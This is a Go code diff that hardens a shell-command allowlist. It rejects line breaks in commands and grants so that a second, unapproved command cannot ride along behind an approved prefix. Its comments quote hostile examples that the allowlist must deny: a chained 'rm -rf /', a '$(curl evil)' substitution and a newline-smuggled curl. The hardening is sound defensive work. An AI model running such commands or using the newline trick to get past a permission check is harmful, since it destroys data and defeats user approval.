@@ -51,6 +51,9 @@ func canonicalTokens(toks []string) []string {
 func NewShellAllowlist(raw []string) *ShellAllowlist {
 	a := &ShellAllowlist{}
 	for _, p := range raw {
+		if hasLineBreak(p) {
+			continue // one grant, one command
+		}
 		if toks := canonicalTokens(shellWords(p)); len(toks) > 0 {
 			a.prefixes = append(a.prefixes, toks)
 		}
@@ -62,18 +65,36 @@ func NewShellAllowlist(raw []string) *ShellAllowlist {
 }
 
 // unsafeShellChars make a command impossible to vouch for as written:
-// operators, redirections, and substitution triggers. They are checked
-// after quote stripping, so even a quoted metacharacter denies —
-// conservative by design: "git status ; rm -rf /" and
-// "git status $(curl evil)" must never auto-run because they start
+// operators, redirections, substitution triggers, and the two line
+// terminators. They are checked after quote stripping, so even a quoted
+// metacharacter denies — conservative by design: "git status ; rm -rf /"
+// and "git status $(curl evil)" must never auto-run because they start
 // with two innocent tokens.
-const unsafeShellChars = ";|&$`<>()"
+//
+// \n and \r are here as well as in hasLineBreak because a metacharacter
+// check alone does not catch them: shellWords treats \n as whitespace,
+// so "git status\ncurl evil" tokenizes to two clean commands and the
+// first two tokens match the grant. A grant is permission for ONE
+// command the user read in the dialog; a second line is a second
+// command nobody approved.
+const unsafeShellChars = ";|&$`<>()\n\r"
+
+// hasLineBreak is the whole-string guard. It runs on the raw command
+// before tokenizing, so a line break cannot be split into words before
+// the check runs, and on grants as well as commands — a grant must
+// never be created from a multi-line string in the first place.
+func hasLineBreak(s string) bool {
+	return strings.ContainsAny(s, "\n\r")
+}
 
 // Allows reports whether command matches any configured prefix. Both
 // sides pass the synonym table, so a grant stored one way matches its
 // flags written the other.
 func (a *ShellAllowlist) Allows(command string) bool {
 	if a == nil {
+		return false
+	}
+	if hasLineBreak(command) {
 		return false
 	}
 	toks := canonicalTokens(shellWords(command))
